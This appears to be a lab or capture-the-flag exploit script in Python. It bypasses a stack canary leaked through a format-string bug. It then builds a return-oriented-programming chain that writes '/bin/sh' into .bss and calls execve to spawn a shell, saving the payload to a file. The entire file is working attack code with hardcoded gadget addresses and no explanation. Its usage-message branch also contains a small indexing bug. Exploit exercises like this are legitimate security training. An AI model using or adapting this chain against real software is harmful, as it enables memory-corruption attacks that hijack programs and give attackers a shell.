#!/usr/bin/env python3
#
# fmt: %13$016llx
#
import sys
from struct import *


if __name__ == '__main__':
	if len(sys.argv) != 2:
		print('Usage: {0} <canary_value>'.format(sys.argv[1]))
		sys.exit(1)

	bss = 0x404058
	canary_val = int(sys.argv[1], 16)
	print('canary_val', hex(canary_val))

	# make the payload
	# create padding and overwrite canary value
	buf = b'A' * 40                      # padding
	buf += pack('<Q', canary_val)       # canary value
	buf += b'A' * 8                      # saved rbp

	# create "/bin/sh" in the writable .bss section
	buf += pack('<Q', 0x4011de)         # pop rdi; pop rsi ; ret
	buf += pack('<Q', bss)              # .bss start addr
	buf += pack('<Q', 0x68732f6e69622f) # new rsi - "/bin/sh\x00" raw values
	buf += pack('<Q', 0x4011ec)         # mov qword ptr [rdi], rsi ; ret

	# create an empty array of strings
	buf += pack('<Q', 0x4011de)         # pop rdi; pop rsi ; ret
	buf += pack('<Q', bss + 8)          # .bss + 8 addr
	buf += pack('<Q', 0x000000)         # new rsi - "/bin/sh\x00" raw values
	buf += pack('<Q', 0x4011ec)         # mov qword ptr [rdi], rsi ; ret

	# setup the registers for syscall and envoke execve
	buf += pack('<Q', 0x4011de)         # pop rdi; pop rsi ; ret
	buf += pack('<Q', bss)              # .bss start addr
	buf += pack('<Q', bss + 8)          # new rsi - pointer to 0
	buf += pack('<Q', 0x4011e3)         # xor rax, rax ; pop rdx ; ret
	buf += pack('<Q', bss + 8)          # new rdx - pointer to 0
	buf += pack('<Q', 0x4011e8) * 0x3b  # inc rax ; ret
	buf += pack('<Q', 0x4011e1)         # syscall

	with open('task3.exp', 'wb+') as f:
		f.write(buf)
